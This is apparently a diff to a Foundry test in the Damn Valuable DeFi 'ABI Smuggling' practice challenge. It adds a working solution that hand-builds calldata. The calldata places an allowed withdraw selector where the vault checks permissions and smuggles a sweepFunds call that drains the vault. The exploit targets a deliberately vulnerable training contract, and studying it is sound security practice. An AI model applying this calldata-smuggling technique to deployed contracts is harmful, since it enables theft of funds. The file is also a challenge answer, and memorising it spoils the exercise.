@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
+import {Bytes} from "@openzeppelin/contracts/utils/Bytes.sol";
 
 contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -17,7 +18,7 @@ contract ABISmugglingChallenge is Test {
     SelfAuthorizedVault vault;
 
     modifier checkSolvedByPlayer() {
-        vm.startPrank(deployer, deployer);
+        vm.startPrank(player, player);
         _;
         vm.stopPrank();
         _isSolved();
@@ -73,10 +74,39 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        bytes memory actionData = abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, address (token));
-        vault.execute(address (vault), actionData);
-    }
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
 
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+
+
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        address(vault).call(calldataPayload);
+
+    }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
